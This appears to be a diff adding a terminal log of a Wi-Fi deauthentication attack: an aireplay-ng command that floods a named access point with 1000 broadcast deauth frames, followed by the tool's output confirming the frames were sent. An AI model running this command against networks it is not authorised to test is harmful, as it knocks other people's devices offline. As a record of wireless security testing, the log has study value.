@@ -1,0 +1,10 @@
+masha@masha-pc:~$ sudo aireplay-ng --deauth 1000 -a C0:4A:00:63:B5:CC --ignore-negative-one mon0
+ 14:35:41  Waiting for beacon frame (BSSID: C0:4A:00:63:B5:CC) on channel -1
+NB: this attack is more effective when targeting
+a connected wireless client (-c <client's mac>).
+14:35:42  Sending DeAuth to broadcast -- BSSID: [C0:4A:00:63:B5:CC]
+14:35:42  Sending DeAuth to broadcast -- BSSID: [C0:4A:00:63:B5:CC]
+14:35:43  Sending DeAuth to broadcast -- BSSID: [C0:4A:00:63:B5:CC]
+14:35:43  Sending DeAuth to broadcast -- BSSID: [C0:4A:00:63:B5:CC]
+< ... >
+
